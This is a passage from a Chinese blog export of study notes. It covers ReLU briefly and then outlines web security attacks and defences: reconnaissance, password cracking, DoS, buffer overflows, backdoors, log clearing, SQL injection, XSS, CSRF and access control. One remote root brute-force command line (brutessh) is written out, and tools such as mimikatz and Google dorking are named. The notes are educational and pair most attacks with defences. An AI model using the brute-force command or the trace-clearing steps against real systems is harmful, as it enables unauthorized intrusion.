<p><img src="https://developers.google.com/machine-learning/crash-course/images/relu.svg" alt="ReLU 激活函数。"></p>
</li>
<li><p>二者相比</p>
<ul>
<li>ReLU 的优势在于：基于实证发现（可能由 ReLU 驱动），拥有更实用的响应范围；</li>
<li>而S 型函数的响应性在两端相对较快地减少；</li>
</ul>
</li>
<li><p>实际上，所有数学函数均可作为激活函数；</p>
</li>
<li><p>假设 σ 表示激活函数（ReLU、S 型函数等），那么，网络中节点的值由以下公式指定：$\sigma(\boldsymbol w \cdot \boldsymbol x+b)$；</p>
</li>
<li><p>TensorFlow 为各种激活函数提供开箱即用型支持，但仍建议从 ReLU 着手。</p>
</li>
</ul>
<h3 id="05-总结"><a href="#05-总结" class="headerlink" title="05-总结"></a>05-总结</h3><ul>
<li><p>现在模型拥有了“神经网络”的所有标准组件：</p>
<ul>
<li>一组节点，类似于神经元，位于层中；</li>
<li>一组权重，表示每个神经网络层与其下方的层之间的关系（下方的层可能是另一个神经网络层，也可能是其他类型的层）；</li>
<li>一组偏差，每个节点一个偏差；</li>
<li>一个激活函数，对层中每个节点的输出进行转换（不同的层可能拥有不同的激活函数）；</li>
</ul>
</li>
<li><p>注意：神经网络不一定始终比特征组合好，但其确实可以提供适用于很多情形的灵活替代方案。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之web安全的攻击与防御</title>
    <url>/2019/04/26/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8Bweb%E5%AE%89%E5%85%A8%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h1 id="03-安全攻击与防御"><a href="#03-安全攻击与防御" class="headerlink" title="03-安全攻击与防御"></a>03-安全攻击与防御</h1><h2 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1-信息收集"></a>3.1-信息收集</h2><h3 id="安全攻击与防护"><a href="#安全攻击与防护" class="headerlink" title="安全攻击与防护"></a>安全攻击与防护</h3><ul>
<li>攻击的过程（踩点-定位-入侵-后门-痕迹<ul>
<li>信息收集</li>
<li>目标分析</li>
<li>实施攻击</li>
<li>方便再次进入</li>
<li>打扫战场<a id="more"></a></li>
</ul>
</li>
<li>防护：针对以上提到的行为了解其原理并考虑应对措施</li>
</ul>
<h3 id="信息收集-入侵的第一步"><a href="#信息收集-入侵的第一步" class="headerlink" title="信息收集-入侵的第一步"></a>信息收集-入侵的第一步</h3><ul>
<li>为何要收集信息（知己知彼，百战不殆<ul>
<li>获取攻击目标大概信息</li>
<li>为下一步攻击做准备</li>
<li>利用收集的信息直接攻击</li>
</ul>
</li>
</ul>
<h3 id="信息收集与分析案例"><a href="#信息收集与分析案例" class="headerlink" title="信息收集与分析案例"></a>信息收集与分析案例</h3><ul>
<li>信息收集的概念：情报学中的一个领域</li>
<li>传统的信息收集：案例：著名的照片泄密案</li>
<li>互联网时代的信息收集<ul>
<li>信息技术的发展使得数据大量被生产出来</li>
<li>案例：明星的家庭住址</li>
</ul>
</li>
</ul>
<h3 id="收集哪些信息"><a href="#收集哪些信息" class="headerlink" title="收集哪些信息"></a>收集哪些信息</h3><ul>
<li>目标系统的信息系统相关资料<ul>
<li>域名、网络拓扑、操纵系统、应用软件</li>
<li>相关脆弱性</li>
</ul>
</li>
<li>目标系统的组织相关资料<ul>
<li>组织架构及关联组织</li>
<li>地理位置细节</li>
<li>电话号码、邮件等联系方式</li>
<li>近期重大事件</li>
<li>员工简介</li>
</ul>
</li>
<li>其他可能令攻击者感性去的任何信息</li>
</ul>
<h3 id="公开信息收集-搜索引擎"><a href="#公开信息收集-搜索引擎" class="headerlink" title="公开信息收集-搜索引擎"></a>公开信息收集-搜索引擎</h3><ul>
<li>快速定位<ul>
<li>Google“5sf67.jsp”可找到存在此脚本的web网站</li>
<li>Google 搜索”teweb/default.tml”就可以找到开放着远程web连接的服务器</li>
</ul>
</li>
<li>信息挖掘<ul>
<li>定点采集（Google搜索”.doc + website”挖掘信息</li>
<li>隐藏信息（.mdb, .ini, .txt, .old, .bak, .001……</li>
<li>后台入口</li>
</ul>
</li>
</ul>
<h3 id="互联网社工库"><a href="#互联网社工库" class="headerlink" title="互联网社工库"></a>互联网社工库</h3><ul>
<li>待收集</li>
</ul>
<h3 id="网络信息收集-域名收集"><a href="#网络信息收集-域名收集" class="headerlink" title="网络信息收集-域名收集"></a>网络信息收集-域名收集</h3><ul>
<li>whois<ul>
<li>whose是一个标准服务，可以用来查询域名是否被注册以及注册的详细资料</li>
<li>whois可以查询到的信息：域名所有者、域名及IP地址对应信息、联系方式、域名到期/注册日期</li>
</ul>
</li>
</ul>
<h3 id="系统及应用信息收集-端口扫描"><a href="#系统及应用信息收集-端口扫描" class="headerlink" title="系统及应用信息收集-端口扫描"></a>系统及应用信息收集-端口扫描</h3><ul>
<li>原理：通过端口扫描确定主机开放的端口，不同的端口对应着不同的网络服务</li>
<li>扫描方式：全扫描、半打开扫描、隐秘扫描、漏洞扫描</li>
<li>端口扫描-Nmap：扫描器之王（使用详情见其他笔记</li>
</ul>
<h3 id="信息收集与分析工具-扫描器"><a href="#信息收集与分析工具-扫描器" class="headerlink" title="信息收集与分析工具-扫描器"></a>信息收集与分析工具-扫描器</h3><ul>
<li>网络设备漏洞扫描器（如Cisco auditing tools</li>
<li>集成化的漏洞扫描器（如Nessus</li>
<li>专业web扫描软件（如appscan</li>
<li>数据库漏洞扫描器（如iss database scanner</li>
</ul>
<h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2-漏洞利用"></a>3.2-漏洞利用</h2><h3 id="利用人性懒惰-密码破解"><a href="#利用人性懒惰-密码破解" class="headerlink" title="利用人性懒惰-密码破解"></a>利用人性懒惰-密码破解</h3><ul>
<li>密码破解方法<ul>
<li>暴力猜解</li>
</ul>
</li>
<li>密码破解工具<ul>
<li>密码暴力破解工具</li>
<li>密码字典生成工具</li>
</ul>
</li>
<li>密码破解防御<ul>
<li>密码生成技巧</li>
<li>密码管理策略</li>
</ul>
</li>
</ul>
<h3 id="暴力猜解法一散列值破解"><a href="#暴力猜解法一散列值破解" class="headerlink" title="暴力猜解法一散列值破解"></a>暴力猜解法一散列值破解</h3><ul>
<li>已知密码的散列算法及散列值的破解方法<ul>
<li>Linux密码散列值</li>
<li>Windows密码散列值（LM-Hash）</li>
</ul>
</li>
<li>获取散列值工具：pwdump7.exe、gethashes.exe、Cain</li>
<li>破解散列值工具：John the ripper、lophtcrack</li>
<li>从网站等公开渠道得到散列值破解结果</li>
</ul>
<h3 id="基于内存信息的读取"><a href="#基于内存信息的读取" class="headerlink" title="基于内存信息的读取"></a>基于内存信息的读取</h3><ul>
<li>神器：mimikatz（如何使用自行百度</li>
</ul>
<h3 id="暴力猜解法二远程密码破解"><a href="#暴力猜解法二远程密码破解" class="headerlink" title="暴力猜解法二远程密码破解"></a>暴力猜解法二远程密码破解</h3><ul>
<li>如远程暴力破解unix口令：<code>brutessh.exe -h ip -IP -u root -d mypasslist.txt</code></li>
</ul>
<h3 id="密码字典-密码破解关键"><a href="#密码字典-密码破解关键" class="headerlink" title="密码字典-密码破解关键"></a>密码字典-密码破解关键</h3><ul>
<li>字典生成器<ul>
<li>根据用户规则快速生成各类密码字典</li>
<li>攻击者常用的工具</li>
</ul>
</li>
<li>密码字典作用<ul>
<li>提高密码破解效率</li>
<li>密码破解知识的具体体现</li>
</ul>
</li>
</ul>
<h3 id="口令攻击方式"><a href="#口令攻击方式" class="headerlink" title="口令攻击方式"></a>口令攻击方式</h3><ul>
<li>暴力破解<ul>
<li>手工方式：社会工程学、尝试默认口令</li>
<li>自动猜测</li>
<li>工具：John、LC、hydra</li>
</ul>
</li>
<li>嗅探窃听<ul>
<li>网络截获、键盘监听</li>
<li>工具：sniffer、IKS</li>
</ul>
</li>
</ul>
<h3 id="metasploit框架"><a href="#metasploit框架" class="headerlink" title="metasploit框架"></a>metasploit框架</h3><ul>
<li>利用msf中mysql相应模块破解mysql</li>
<li>msf同样可破解其他，如tomcat</li>
</ul>
<h3 id="密码破解安全防御"><a href="#密码破解安全防御" class="headerlink" title="密码破解安全防御"></a>密码破解安全防御</h3><ul>
<li>设置好的密码：自己容易记，别人不好猜</li>
<li>系统及应用安全策略：账户锁定策略</li>
<li>随机验证码</li>
<li>其他密码管理策略<ul>
<li>密码专用/分级，不同应用/系统/网站不同密码</li>
<li>专用密码管理工具</li>
<li>A、B角</li>
</ul>
</li>
</ul>
<h3 id="利用人性弱点-社会工程学攻击"><a href="#利用人性弱点-社会工程学攻击" class="headerlink" title="利用人性弱点-社会工程学攻击"></a>利用人性弱点-社会工程学攻击</h3><ul>
<li>什么是社会工程学攻击：利用人性弱点（本能反应、贪婪、易于信任）进行欺骗获取利益的攻击方法</li>
<li>社会工程学的危险<ul>
<li>永远有效的攻击方法</li>
<li>人是最不可控的因素</li>
</ul>
</li>
<li>人性的弱点<ul>
<li>信任权威</li>
<li>信任共同爱好</li>
<li>获得好处后报答</li>
<li>期望守信</li>
<li>期望社会认可</li>
<li>短缺资源的渴望</li>
</ul>
</li>
<li>传统的社会工程学：中奖通知、欠费电话、退税短信、催交房租</li>
<li>网络社会中的社会工程学<ul>
<li>直接用于攻击<ul>
<li>正面攻击（直接索取</li>
<li>建立信任</li>
<li>利用同情、内疚和胁迫</li>
</ul>
</li>
<li>间接用于攻击<ul>
<li>口令破解中的社会工程学利用</li>
<li>网络攻击中的社会工程学利用</li>
</ul>
</li>
</ul>
</li>
<li>社会工程学防御<ul>
<li>安全意识培训<ul>
<li>知道什么是社会工程攻击</li>
<li>社会工程学利用什么</li>
</ul>
</li>
<li>建立相应的安全响应应对措施<ul>
<li>构建完善的技术防御体系</li>
<li>有效的安全管理体系和操作流程</li>
</ul>
</li>
<li>注意保护个人隐私（生日、手机号码</li>
</ul>
</li>
</ul>
<h3 id="利用系统缺陷-拒绝服务攻击"><a href="#利用系统缺陷-拒绝服务攻击" class="headerlink" title="利用系统缺陷-拒绝服务攻击"></a>利用系统缺陷-拒绝服务攻击</h3><ul>
<li>拒绝服务攻击：让被攻击的系统无法正常进行服务的攻击方式（是一类攻击方式的统称）</li>
<li><p>拒绝服务攻击方式</p>
<ul>
<li>利用系统、协议或服务的漏洞<ul>
<li>利用TCP协议实现缺陷</li>
<li>利用操作系统或应用软件的漏洞</li>
</ul>
</li>
<li>目标系统服务资源能力<ul>
<li>利用大量数据挤占网络带宽</li>
<li>利用大量请求消耗系统性能</li>
</ul>
</li>
<li>混合型</li>
</ul>
</li>
<li><p>典型的拒绝服务攻击方式：syn flood、udp flood、teardrop、smurf、land……</p>
</li>
<li>分布式拒绝服务攻击DDOS</li>
</ul>
<h3 id="拒绝服务攻击的防御"><a href="#拒绝服务攻击的防御" class="headerlink" title="拒绝服务攻击的防御"></a>拒绝服务攻击的防御</h3><ul>
<li>管理防御<ul>
<li>业务连续性计划（组织共同承担，应对Dos攻击</li>
<li>协调机制（运营商、公安部门、专家团队</li>
</ul>
</li>
<li>技术防御<ul>
<li>安全设备（防火墙、抗dos设备</li>
<li>增强网络带宽</li>
<li>自身强壮性（风险评估、补丁、安全加固、资源控制</li>
</ul>
</li>
<li>检测防御：应急响应（构建检测体系</li>
</ul>
<h3 id="利用系统开发缺陷-缓冲区溢出"><a href="#利用系统开发缺陷-缓冲区溢出" class="headerlink" title="利用系统开发缺陷-缓冲区溢出"></a>利用系统开发缺陷-缓冲区溢出</h3><ul>
<li>攻击原理：缓冲区溢出攻击利用编写不够严谨的程序，通过向程序的缓冲区写入超过预定长度的数据，造成缓存的溢出，从而破坏程序的堆栈，导致程序执行流程的改变</li>
<li>缓冲区溢出的危害<ul>
<li>最大数量的漏洞类型</li>
<li>漏洞危害等级高</li>
</ul>
</li>
</ul>
<h3 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h3><ul>
<li>堆栈：一段连续分配的内存空间</li>
<li><p>堆栈特点</p>
<ul>
<li>后进先出</li>
<li>堆栈生长方向与内存地址方向相反</li>
</ul>
</li>
<li>指针：指向内存单元的地址</li>
<li><p>寄存器：</p>
<ul>
<li>暂存指令、数据和位址</li>
<li>ESP（栈顶）、EBP（栈底）、EIP（返回地址）</li>
</ul>
</li>
<li><p>攻击过程</p>
<ul>
<li>如果可以精确控制内存跳转地址，就可以执行指定代码，获得权限或破坏系统</li>
<li>寻找程序漏洞-编制缓冲区溢出程序-精确控制跳转地址-执行设定的代码-获得系统权限或破坏系统</li>
</ul>
</li>
<li><p>漏洞的利用：metasploit使用（见其他笔记</p>
</li>
<li><p>如何防范</p>
<ul>
<li>用户：补丁、防火墙</li>
<li>开发人员<ul>
<li>编写安全代码，对输入数据进行验证</li>
<li>使用相对安全的函数</li>
</ul>
</li>
<li>系统<ul>
<li>缓冲区不可执行技术</li>
<li>虚拟化技术</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-3-后门及日志"><a href="#3-3-后门及日志" class="headerlink" title="3.3-后门及日志"></a>3.3-后门及日志</h2><h3 id="后门设置的方法"><a href="#后门设置的方法" class="headerlink" title="后门设置的方法"></a>后门设置的方法</h3><ul>
<li>后门可以作什么<ul>
<li>方便下次直接进入</li>
<li>监视用户所有行为、隐私</li>
<li>完全控制用户主机</li>
</ul>
</li>
<li>后门设置的类型<ul>
<li>账号后门<ul>
<li>现有管理员账号密码/新建账号/升级现有账号权限</li>
<li>普通账号shell设置setuid</li>
</ul>
</li>
<li>漏洞后门</li>
<li>木马（rootkit</li>
<li>脚本后门</li>
</ul>
</li>
</ul>
<h3 id="后门的清除及防范"><a href="#后门的清除及防范" class="headerlink" title="后门的清除及防范"></a>后门的清除及防范</h3><ul>
<li>账号后门<ul>
<li>管理员账号：定期更换密码</li>
<li>定期检查系统是否有多余账号和具有管理员权限的账号</li>
<li>检查Linux系统中的setuid程序</li>
</ul>
</li>
<li>漏洞后门<ul>
<li>补丁</li>
</ul>
</li>
<li>后门木马<ul>
<li>杀毒软件</li>
<li>系统检查：服务、进程、端口</li>
<li>完整性检验</li>
</ul>
</li>
<li>脚本后门<ul>
<li>安全脚本备份</li>
<li>网页防篡改</li>
</ul>
</li>
</ul>
<h3 id="攻击痕迹清除"><a href="#攻击痕迹清除" class="headerlink" title="攻击痕迹清除"></a>攻击痕迹清除</h3><ul>
<li>清除/改写日志<ul>
<li>要知道常见的日志存放路径</li>
<li>修改系统日期</li>
</ul>
</li>
<li>删除中间文件</li>
<li>删除创建的用户</li>
</ul>
<h3 id="攻击痕迹清除防护措施-日志保护"><a href="#攻击痕迹清除防护措施-日志保护" class="headerlink" title="攻击痕迹清除防护措施-日志保护"></a>攻击痕迹清除防护措施-日志保护</h3><ul>
<li>日志设置<ul>
<li>尽可能多的信息</li>
<li>日志时间</li>
<li>日志空间</li>
</ul>
</li>
<li>日志权限</li>
<li>日志存储<ul>
<li>本地路径及备份方式</li>
<li>网络存储（日志服务器</li>
</ul>
</li>
</ul>
<h3 id="日志分析重点"><a href="#日志分析重点" class="headerlink" title="日志分析重点"></a>日志分析重点</h3><ul>
<li>日期 时间（确定攻击的时间</li>
<li>源IP（确定攻击者IP</li>
<li>请求方法（部分情况下要关注post操作</li>
<li>请求链接（查找链接中的特殊字符串</li>
<li>状态代码（了解操作结果</li>
</ul>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ul>
<li>关注超长的记录<ul>
<li>http协议对URL长度没有限制</li>
<li>一般网站正常情况下不需要太长的URL</li>
</ul>
</li>
<li>关注记录中的非正常编码<ul>
<li>例如红色代码蠕虫攻击会形成如下记录（略</li>
</ul>
</li>
<li>关注日志请求链接中的关键字<ul>
<li>cmd、select、xp_cmdshell、post等</li>
</ul>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>信息收集与分析</li>
<li>基于人性弱点的攻击：密码破解、社会工程学</li>
<li>基于系统及协议缺陷的攻击：拒绝服务，电子欺骗</li>
<li>基于软件开发缺陷的攻击：缓冲区溢出、sql注入、跨站脚本</li>
<li>后门与日志分析</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之Web安全威胁</title>
    <url>/2019/04/24/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8BWeb%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81/</url>
    <content><![CDATA[<h1 id="02-Web主流安全威胁"><a href="#02-Web主流安全威胁" class="headerlink" title="02-Web主流安全威胁"></a>02-Web主流安全威胁</h1><h2 id="2-1-注入攻击"><a href="#2-1-注入攻击" class="headerlink" title="2.1-注入攻击"></a>2.1-注入攻击</h2><ul>
<li>注入攻击<ul>
<li>SQL注入</li>
<li>命令注入</li>
<li>其他注入</li>
</ul>
</li>
<li>注入攻击发生在当不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者访问未被授权的数据<a id="more"></a></li>
<li>注入漏洞通常能在SQL、LDAP、XPath或是NoSQL查询语句、OS命令、XML解析器、SMTP包头、表达式语句及ORM查询语句中找到</li>
<li>常见类型：SQL注入、OS命令注入、XML注入、LDAP注入</li>
</ul>
<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><ul>
<li>当应用程序将用户输入的内容，拼接到SQL语句中，一起提交给数据库执行时，就会产生SQL注入威胁</li>
<li>由于用户的输入，也是SQL语句的一部分，所以攻击者可以利用这部分可以控制的内容，注入自己定义的语句，改变SQL语句执行逻辑，让数据库执行任意自己需要的指令。通过控制部分SQL语句，攻击者可以查询数据库中任何自己需要的数据，利用数据库的一些特性，可以直接获取数据库服务器的系统权限。</li>
</ul>
<h3 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h3><ul>
<li>防止注入漏洞需要将数据与命令语句、查询语句分隔开来</li>
<li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架</li>
<li>检测参数：可以通过对用户输入参数进行过滤和检查，去除拼接数据或检查合法性</li>
<li>敏感信息加密</li>
<li>低权限账户连接数据库</li>
<li>预处理执行SQL语句：使用预处理执行SQL语句，对所有传入SQL语句中的变量，做绑定。这样，用户拼接进来的变量，无论内容是什么，都会被当作替代符号“？”所替代的值，数据库也不会把恶意用户拼接进来的数据，当作部分SQL语句去解析。</li>
</ul>
<h3 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h3><ul>
<li>黑客通过把html代码输入一个输入机制（例如缺乏有效验证限制的表格域）来改变网页的动态生成的内容。一个恶意黑客可利用这种攻击方法来非法获取数据或网络资源。</li>
<li>预防：对于命令注入，最主要的方法是对表单输入或者选择的内容进行验证。</li>
<li>与SQL注入区别：sql注入数据库相关，命令注入操作系统相关，大同小异。</li>
</ul>
<h2 id="2-2-XSS"><a href="#2-2-XSS" class="headerlink" title="2.2-XSS"></a>2.2-XSS</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
<li>XSS攻击：跨站脚本攻击-cross site scripting-XSS，层叠样式表CSS</li>
<li>XSS跨站脚本，是一种迫使web站点回显可执行代码的攻击技术，而这些可执行代码由攻击者提供，最终为用户浏览器加载。</li>
<li>不同于大多数攻击（一般只涉及攻击者和受害者），XSS涉及到三方，即攻击者、客户端与网站。</li>
<li>此类型的漏洞由于被骇客用来编写危害性更大的phishing攻击而变得广为人知。</li>
<li>跨站脚本攻击是到目前为止最受关注的、威胁最高的攻击手段；</li>
<li>通过xss攻击，攻击者可以窃取网页访问者保存在终端的各种账号信息，并且可以通过脚本盗窃用户的cookie，劫持用户与web服务器的会话；</li>
</ul>
<h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><ul>
<li>通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被html解析、执行。</li>
<li>其特点是非持久化，必须用户点击带有特定参数的链接才能引起；</li>
<li>反射性xss漏洞的关键在于攻击者需要构造一个能够触发脚本运行的URL，并诱骗受害者点击这个URL，点击之后，服务器就会响应并注入脚本到客户端的浏览器；</li>
</ul>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><ul>
<li>是指用户提交给web应用程序的数据首先旧被永久的保存在服务器的数据库、文件系统或者其他地方，后面且未做任何编码就能显示到web页面，当其他用户浏览该链接时就会造成xss攻击</li>
<li>最典型的是05年在myspace发现的xss漏洞以及利用该漏洞的samy MySpace worm；</li>
</ul>
<h3 id="xss对web的威胁"><a href="#xss对web的威胁" class="headerlink" title="xss对web的威胁"></a>xss对web的威胁</h3><ul>
<li>主要体现在黑客所注入的脚本，这些脚本主要实现的目的有：</li>
<li>盗取用户的cookie，劫持会话</li>
<li>获取用户敏感信息</li>
<li>讲访问重定向，重定向到钓鱼网站</li>
</ul>
<h3 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h3><ul>
<li>对所有用户提交内容进行可靠的输入验证，进行编码替代，例如&lt; = &amp;lt, &gt; &amp;gt<ul>
<li>包括对URL、查询关键字、http头、post数据等，仅接受指定长度范围内，采取适当格式，采用所预期的字符的内容提交</li>
</ul>
</li>
<li>确认接受的内容被妥善的规范化，仅包含最小的、安全的tag，没有javascript，去掉任何对远程内容的饮用（尤其是样式表和javascript），使用http only 的cookie</li>
<li>部署xss攻击防御产品</li>
</ul>
<h2 id="2-3-认证会话管理"><a href="#2-3-认证会话管理" class="headerlink" title="2.3-认证会话管理"></a>2.3-认证会话管理</h2><h3 id="身份认证和会话管理"><a href="#身份认证和会话管理" class="headerlink" title="身份认证和会话管理"></a>身份认证和会话管理</h3><ul>
<li>身份认证：最常见的登录功能，往往是提交用户名和密码，在安全性要求更高的情况下，有防止密码暴力破解的验证码，基于客户端的证书，物理口令卡等</li>
<li>会话管理：http本身是无状态的，利用会话管理机制来实现连接识别，身份认证的结果往往是获得一个令牌，通常放在cookie中，之后对用户身份的识别根据这个授权的令牌进行识别，而不需要每次都要登录</li>
</ul>
<h3 id="身份认证漏洞与影响"><a href="#身份认证漏洞与影响" class="headerlink" title="身份认证漏洞与影响"></a>身份认证漏洞与影响</h3><table>
<thead>
<tr>
<th>漏洞</th>
<th>影响</th>
</tr>
</thead>
<tbody>
<tr>
<td>弱密码</td>
<td>增加了破解密码和词典攻击的风险</td>
</tr>
<tr>
<td>配置文件中使用明文凭据</td>
<td>可访问服务器的内部人员都能直接访问凭据</td>
</tr>
<tr>
<td>通过网络传递明文凭据</td>
<td>攻击者可通过监控网络来盗取身份验证凭据并窃取身份</td>
</tr>
<tr>
<td>账户的特权加强</td>
<td>与进程和账户泄漏相关的风险增加</td>
</tr>
<tr>
<td>混用个性化数据的身份验证数据</td>
<td>个性化数据适于永久的cookie，而身份验证的cookie不应是永久的</td>
</tr>
</tbody>
</table>
<h3 id="认证漏洞案例"><a href="#认证漏洞案例" class="headerlink" title="认证漏洞案例"></a>认证漏洞案例</h3><ul>
<li>登录认证次数没有限制：web登录认证界面，没有验证码，也没有次数限制，通过暴力破解工具，可遍历字典，尝试破解登录</li>
<li>用户忘记密码后，密码找回功能太过简单：比如密码找回利用密保问题，但密保问题设计逻辑存在一定问题，如密保问题”你最喜欢的颜色是什么？”</li>
</ul>
<h3 id="http会话管理概述"><a href="#http会话管理概述" class="headerlink" title="http会话管理概述"></a>http会话管理概述</h3><ul>
<li>http是无状态的：一个客户端计算机上运行web浏览器必须建立一个新的传输控制协议TCP的网络连接到每一个新的web服务器的http get或POST请求。web服务器，因此不能依赖于建立的tcp比单个http get或post较长的运行网络连接</li>
<li>会话管理是由web开发人员用来进行http协议无状态会话状态支持的技术。例如，一旦用户验证自己的web服务器，他的下一个http请求（get或post）不应导致web服务器重新认证</li>
<li>在存储的会话ID和相应的会话数据（用户名，账号等，在web服务器上）目前使用了多种技术，包括但不限于：本地存储和数据库等。</li>
</ul>
<h3 id="会话劫持攻击"><a href="#会话劫持攻击" class="headerlink" title="会话劫持攻击"></a>会话劫持攻击</h3><ul>
<li>http会话劫持</li>
<li>web应用程序是通过2种方式来判断和跟踪不同用户的：cookie或者session。<ul>
<li>cookie是存储在本地计算机上的，过期时间很长，所以针对cookie的攻击手段一般是盗取用户cookie然后伪造cookie冒充该用户</li>
<li>session由于其存在与服务端，随着会话的注销而失效（很快过期），往往难以利用，故一般来说session较cookie认证安全</li>
</ul>
</li>
</ul>
<h3 id="会话重放攻击"><a href="#会话重放攻击" class="headerlink" title="会话重放攻击"></a>会话重放攻击</h3><ul>
<li>重放攻击与cookie</li>
<li>我们监听http数据传输的截获的敏感数据大多数就是存放在 cookie中的数据。</li>
<li>其实在web安全中的其他方式（非网络监听）盗取cookie与提交cookie也是一种重放攻击。</li>
<li>我们有时候可以轻松复制别人的cookie直接获得相应的权限</li>
</ul>
<h3 id="会话管理漏洞案例"><a href="#会话管理漏洞案例" class="headerlink" title="会话管理漏洞案例"></a>会话管理漏洞案例</h3><ul>
<li>没有会话超时限制：</li>
<li>关闭浏览器，但会话不失效</li>
<li>应用程序超时设置不当名，用户使用公共计算机访问网站。离开时，该用户没有点击退出，而是直接关闭浏览器。攻击者在一个小时后能使用相同浏览器通过身份认证</li>
</ul>
<h3 id="认证和会话管理漏洞防御"><a href="#认证和会话管理漏洞防御" class="headerlink" title="认证和会话管理漏洞防御"></a>认证和会话管理漏洞防御</h3><ul>
<li>增强口令安全</li>
<li>认证凭证安全加密存储</li>
<li>网络传递认证凭证采用ssl加密</li>
<li>避免用户账户权限加强</li>
<li>身份认证设计完善</li>
</ul>
<h2 id="2-4-CSRF"><a href="#2-4-CSRF" class="headerlink" title="2.4-CSRF"></a>2.4-CSRF</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul>
<li>跨站请求伪造（cross-site request forgery），csrf</li>
<li>即攻击者通过调用第三方网站的恶意脚本或者利用程序来伪造请求，当然并不需要相用户端伪装任何具有欺骗性的内容，在用户不知情时攻击者直接利用用户的浏览器向攻击的应用程序提交一个已经预测好请求参数的操作数据包，利用的实质是劫持用户的会话状态，强行提交攻击者构造的具有”操作行为”的数据包。</li>
</ul>
<h3 id="攻击关键"><a href="#攻击关键" class="headerlink" title="攻击关键"></a>攻击关键</h3><ul>
<li>伪造一个已经预测好请求参数的操作数据包<ul>
<li>get请求，URL即包含了请求的参数</li>
<li>post请求，需要借助ajax实现</li>
</ul>
</li>
<li>在用户没有退出正常会话时，引诱用户点击提交伪造的请求</li>
</ul>
<h3 id="CSRF的检测"><a href="#CSRF的检测" class="headerlink" title="CSRF的检测"></a>CSRF的检测</h3><ul>
<li>检测应用程序是否存在该漏洞的方法是查看是否每个链接和表单都提供了不可预测的CSRF令牌。没有这样的令牌，攻击者就能够伪造恶意请求</li>
<li>重点关注那些调用能够改变状态功能的链接和表格，因为他们是跨站请求伪造攻击的最重要的目标</li>
<li>请注意：会话cookie、源IP地址和其他浏览器自动发送的信息不能作为防攻击令牌，因为这些信息已经包含咋伪造的请求中。</li>
</ul>
<h3 id="CSRF预防方案"><a href="#CSRF预防方案" class="headerlink" title="CSRF预防方案"></a>CSRF预防方案</h3><ul>
<li>为每个链接和表单都提供了不可预测的CSRF令牌，令牌可以基于表单的隐藏字段实现，但不能通过cookie实现</li>
<li>要求用户证明他们要提交请求，可以通过重新认证的方式或者其他能够证实他们是真实用户的方法（比如验证码</li>
<li>在特殊场合，增加多级验证（例如提示确认页面或再次输入手机验证码），也能很好的防护CSRF</li>
</ul>
<h3 id="预防CSRF案例"><a href="#预防CSRF案例" class="headerlink" title="预防CSRF案例"></a>预防CSRF案例</h3><ul>
<li>对于POST表单请求的预防</li>
<li>要求所有POST请求都包含一个伪随机值</li>
<li>当用户访问站点时，该站点该生成一个（密码上很强壮的）伪随机值（作为表单值和cookie值）</li>
<li>当一个post请求被发动到站点时，只有表单值和cookie值相同时，该请求才会被认为是有效的。</li>
<li>当然，为了增加复杂性，可以将cookie进行进一步的hash运算以增加攻击难度。</li>
</ul>
<h2 id="2-5-访问控制-amp-敏感信息泄漏-amp-有漏洞的组件"><a href="#2-5-访问控制-amp-敏感信息泄漏-amp-有漏洞的组件" class="headerlink" title="2.5-访问控制&amp;敏感信息泄漏&amp;有漏洞的组件"></a>2.5-访问控制&amp;敏感信息泄漏&amp;有漏洞的组件</h2><h3 id="访问控制权限错误"><a href="#访问控制权限错误" class="headerlink" title="访问控制权限错误"></a>访问控制权限错误</h3><ul>
<li>访问控制权限错误，意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象</li>
<li>常见表现形式：水平权限、垂直权限</li>
</ul>
<h3 id="水平权限访问控制错误案例"><a href="#水平权限访问控制错误案例" class="headerlink" title="水平权限访问控制错误案例"></a>水平权限访问控制错误案例</h3><ul>
<li>当当手机客户端，查看任意订单漏洞（包括收件人电话地址等信息</li>
<li>壹药网越权访问其他用户信息包括地址、姓名、手机号等</li>
</ul>
<h3 id="访问控制错误预防"><a href="#访问控制错误预防" class="headerlink" title="访问控制错误预防"></a>访问控制错误预防</h3><ul>
<li>用户权限与身份严格管理，任何动作执行都需要检验身份</li>
<li>检查访问，任何来自不可信源的直接对象引用都必须通过访问控制检测，确保该用户对请求的对象有访问权限</li>
</ul>
<p>###敏感信息泄漏概述</p>
